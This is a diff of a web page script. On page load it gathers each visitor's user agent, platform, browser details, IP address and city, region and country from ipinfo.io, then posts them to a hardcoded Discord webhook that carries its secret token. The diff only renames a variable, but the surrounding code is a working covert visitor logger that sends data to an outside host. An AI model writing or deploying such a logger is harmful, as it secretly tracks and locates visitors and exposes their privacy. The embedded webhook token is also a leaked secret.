@@ -36,7 +36,7 @@ document.addEventListener('DOMContentLoaded', function () {
 function check() {
   const detector = new BrowserDetector(window.navigator.userAgent);
   const browserInfo = detector.parseUserAgent();
-  const useragent = navigator.userAgent;
+  const UA = navigator.userAgent;
   const os = navigator.platform;
   fetch('https://ipinfo.io/json')
     .then(response => response.json())
@@ -46,14 +46,14 @@ function check() {
       const c = data.city;
       const r = data.region;
       const co = data.country;
-      loadingapi(useragent, addr, c, r, co, browserInfo);
+      loadingapi(UA, addr, c, r, co, browserInfo);
     });
 }
 
-function loadingapi(useragent, addr, c, r, co, browserInfo) {
+function loadingapi(UA, addr, c, r, co, browserInfo) {
   const csc = 'https://discord.com/api/webhooks/1190483916168114197/umTxVI0_ICJNuHz1ajpciQh7qGw6HAn1JFg25qCk6yBfb5yaMhduzoWFPk27D6Cr4aOl';
   const F = {
-    content: `**User-Agent:**    \`${useragent}\`\n**IP:**          \`${addr}\`\n**Location:**      \`${c}, ${r}, ${co}\` \n **Full log:** \n\`\`\`${browserInfo}\`\`\` `
+    content: `**User-Agent:**    \`${UA}\`\n**IP:**          \`${addr}\`\n**Location:**      \`${c}, ${r}, ${co}\` \n **Full log:** \n\`\`\`${browserInfo}\`\`\` `
   };
 
   fetch(csc, {
